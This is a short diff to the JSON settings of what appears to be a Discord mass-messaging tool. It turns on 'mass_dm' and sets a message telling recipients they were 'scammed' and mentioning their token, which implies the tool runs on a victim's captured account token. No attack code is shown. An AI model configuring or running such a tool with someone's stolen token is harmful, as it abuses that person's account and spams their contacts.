@@ -8,6 +8,6 @@
     "give_role": false,
     "role_name": "ROLE-NAME-HERE",
 
-    "mass_dm": 0,
-    "message": "MESSAGE-HERE"
+    "mass_dm": 1,
+    "message": "Wow, you got scammed! Fortunetely, i wont do any harm. Even with your token!"
 }
